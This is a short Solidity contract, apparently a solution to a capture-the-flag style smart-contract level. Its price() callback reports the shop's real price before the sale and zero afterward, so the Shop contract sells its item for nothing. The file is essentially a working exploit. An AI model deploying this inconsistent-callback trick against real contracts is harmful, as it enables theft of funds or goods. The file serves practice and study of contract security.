// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Buyer.sol";
import "./Shop.sol";

error ErrShopNotInit();

contract Attack is Buyer {
    address shop = address(0x0);

    function doAttack(address addr) external {
        shop = addr;
        Shop(shop).buy();
    }

    function price() external view returns (uint) {

        if (shop == address(0x0))
            revert ErrShopNotInit();

        if (Shop(shop).isSold())
            return 0;

        return Shop(shop).price();
    }

}